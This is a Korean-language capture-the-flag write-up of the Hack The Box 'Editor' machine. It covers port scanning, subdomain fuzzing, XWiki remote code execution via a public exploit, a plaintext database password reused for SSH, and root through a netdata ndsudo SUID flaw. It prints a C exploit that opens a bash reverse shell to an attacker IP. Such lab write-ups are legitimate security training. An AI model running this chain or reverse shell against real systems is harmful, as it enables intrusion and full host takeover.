---
title: (HTB - Linux) Editor
categories: [Playground, Hack The Box]
tags: [HTB, WriteUp]
image:
  path: /assets/post/2025/Playground/Hack The Box/thumb.png
  alt: Editor / Linux / Easy
published: false
---

<img src='assets/post/2025/Playground/Hack The Box/Editor/0.png' width=1200 alt=''>

---

## INFORMATION GATHERING
### NMAP - TCP PORT SCANNING

- 개방된 TCP 포트 : 22, 80, 8080  
- 22번 포트에서 운영중인 SSH는 취약한 버전으로 보이지는 않음  
- 80번, 8080번 포트에서 운영되고 있는 웹 서비스에 대하여 정보수집이 필요해보임  

```zsh
└─# nmap -p- -sC -sV -Pn -n --min-rate 10000 10.129.3.82 -oN 10.129.3.82_TCP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 05:25 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Warning: 10.129.3.82 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.3.82
Host is up (0.24s latency).
Not shown: 61376 closed tcp ports (reset), 4156 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.3.82:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.86 seconds
```

### NMAP - UDP PORT SCANNING
- 개방된 UDP 포트 : 68  
- 68번 포트에서는 DHCP 관련 서비스가 운영되고 있었으며 취약점은 발견되지 않았다.  

```zsh
└─# nmap -sU -sV -Pn -n --top-ports 100 10.129.3.82 -oN 10.129.3.82_UDP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 05:26 EDT
Nmap scan report for 10.129.3.82
Host is up (0.21s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 218.35 seconds
```

---

## 사전 준비
- 80번, 8080번 포트 접근 시 `Unknown host: editor.htb` 에러가 발생했다.  
- 도메인에 접근하기 위해 `/etc/hosts` 파일에 정보를 추가한다.  

```zsh
└─# echo '10.129.3.82 editor.htb' >> /etc/hosts

└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.129.3.82 editor.htb
```

<br>

- 80번 포트는 정적 페이지로 특별한 정보는 발견되지 않았다.  
- `http://editor.htb:8080` 경로로 접속을 시도한다.  


## DIRECTORY ENUMERATION
- `gobuster` 도구로 디렉토리 열거를 진행한 결과 특별한 정보는 발견되지 않았다.  
  - (1) /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  
  - (2) /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt

---

## SUBDOMAIN ENUMERATION
- `ffuf` 도구를 사용하여 서브도메인 열거를 진행한 결과 `wiki` 서브도메인을 발견했다.  

```zsh
└─# ffuf -u 'http://editor.htb' -H 'Host: FUZZ.editor.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editor.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.editor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 220ms]
:: Progress: [4989/4989] :: Job [1/1] :: 191 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

<br>

- 발견한 서브도메인을 `/etc/hosts` 파일에 추가 후 서브도메인으로 접속을 시도한다.  

```zsh
└─# echo '10.129.3.82 wiki.editor.htb' >> /etc/hosts
```

<br>

- 8080 포트에서 운영되는 웹 서비스 페이지에 접속 후 홈페이지 하단에서 `XWiki Debian 15.10.8` 정보를 확인했다.  

<img src='assets/post/2025/Playground/Hack The Box/Editor/1.png' width=1200 alt=''>


- `searchsploit` 도구를 통해 `XWiki` 관련 공개 익스플로잇이 존재하는지 확인한다.  
- `XWiki Platform 15.10.10` 이하의 버전에서 RCE 공격이 가능하였다.  

```zsh
└─# searchsploit Xwiki
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerabilities                  | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                                                    | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Remote Code Execution                                                   | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE)                                                | php/webapps/52105.py
-------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

<br>

---

## INITIAL ACCESS

- 익스플로잇 코드를 이용하여 `xwiki` 계정의 쉘 획득에 성공했다.  
  - https://github.com/gunzf0x/CVE-2025-24893

```zsh
└─# git clone https://github.com/gunzf0x/CVE-2025-24893.git
Cloning into 'CVE-2025-24893'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (7/7), done.
Resolving deltas: 100% (1/1), done.

[ . . . ]

└─# chmod +x CVE-2025-24893.py
```

<img src='assets/post/2025/Playground/Hack The Box/Editor/2.png' width=1200 alt=''>

<br>

- 대상 호스트에는 `python3`가 설치되어 있었다. 원활한 공격을 위해 FULL TTY 쉘로 업그레이드한다.  

```zsh
└─# rlwrap nc -lvnp 9001                                                                                                    
listening on [any] 9001 ...                                                                                                 
python3 --version
Python 3.10.12

[ . . . ]

connect to [10.10.14.66] from (UNKNOWN) [10.129.3.82] 48934
python3 -c 'import pty;pty.spawn("/bin/bash")'
xwiki@editor:/usr/lib/xwiki-jetty$                                                                                          
zsh: suspended  rlwrap nc -lvnp 9001                                                                                        
                                                                                                                            
┌──(root㉿kali)-[/home/kali/Desktop/htb]
└─# stty raw -echo; fg
[1]  + continued  rlwrap nc -lvnp 9001
xwiki@editor:/usr/lib/xwiki-jetty$ reset
reset
reset: unknown terminal type unknown
Terminal type? xterm-256color
xterm-256color
xwiki@editor:/usr/lib/xwiki-jetty$ export SHELL=bash
export SHELL=bash
xwiki@editor:/usr/lib/xwiki-jetty$ export TERM=xterm-256color
export TERM=xterm-256color
xwiki@editor:/usr/lib/xwiki-jetty$
```

<img src='assets/post/2025/Playground/Hack The Box/Editor/3.png' width=1200 alt=''>

<br>

---

## INTERNAL RECONNAISSANCE
- (1) 대상 호스트 내부로 침투 성공 후 정보를 수집한다.  
- (2) 정보수집 과정에서 8080 포트에서 `Xwiki`가 실행되고 있음을 확인했다. 이와 관련된 설정파일 정보를 확인한다.  
- (3) `Xwiki`의 설정파일 위치 확인 후 정보를 수집한다.  


<img src='assets/post/2025/Playground/Hack The Box/Editor/4.png' width=1200 alt=''>

<br>

- `/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml` 파일로부터 평문 패스워드를 획득했다.  

<img src='assets/post/2025/Playground/Hack The Box/Editor/5.png' width=1200 alt=''>

---

## LATERAL MOVEMENT
- `/home` 디렉토리로부터 `oliver` 계정이 존재함을 확인했다.  
- 획득한 패스워드("theEd1t0rTeam99")를 이용하여 `oliver` 계정으로 SSH 접속을 시도하였으며 성공했다.

<img src='assets/post/2025/Playground/Hack The Box/Editor/6.png' width=1200 alt=''>


---

## PRIVILEGE ESCALATION

- 권한상승 포인트 확인을 위해 SUID가 설정된 바이너리를 탐색한다.  
- "/opt" 경로에 존재하는 바이너리는 운영체제 기본 바이너리(/bin, /usr/bin)가 아닌 서드파티/벤더 소프트웨어, 상용 패키지, 수동 설치된 프로그램들을 두는 곳이다. 따라서, 해당 경로에 SUID 권한이 설정된 바이너리가 존재한다면 권한상승 포인트로 악용할 수 있다.  

```zsh
oliver@editor:~$ find / -type f -perm -4000 2>/dev/null
                                        find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

---

- (1) 위 과정에서 살펴본 경로에 대해 공개된 SUID 관련 권한상승 익스플로잇이 있는지 확인한다.  
- (2) `CVE-2024-32019` 익스플로잇의 존재를 확인했다. 권한상승을 시도해본다.  

<img src='assets/post/2025/Playground/Hack The Box/Editor/7.png' width=1200 alt=''>

<br>

- 아래 URL에서 개념증명 코드 다운로드 후 리버스쉘 연결을 위해 IP/PORT 값을 수정한다.  
  - https://github.com/AliElKhatteb/CVE-2024-32019-POC

```zsh
└─# git clone https://github.com/AliElKhatteb/CVE-2024-32019-POC.git
Cloning into 'CVE-2024-32019-POC'...                                                                                        
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.                                                                                 
remote: Compressing objects: 100% (7/7), done.                
remote: Total 7 (delta 1), reused 3 (delta 0), pack-reused 0 (from 0)     
Receiving objects: 100% (7/7), done.
Resolving deltas: 100% (1/1), done.

[ . . . ]

└─# cat exploit.c                                      
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL
                               
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.66/9002 0>&1", NULL);
    return 0;
}
```

<br>

- 익스플로잇 코드를 실행하여 루트 권한 탈취에 성공했다.  
<img src='assets/post/2025/Playground/Hack The Box/Editor/8.png' width=1200 alt=''>
<img src='assets/post/2025/Playground/Hack The Box/Editor/9.png' width=1200 alt=''>

---

# REFERENCE

1. https://github.com/gunzf0x/CVE-2025-24893
2. https://github.com/AliElKhatteb/CVE-2024-32019-POC
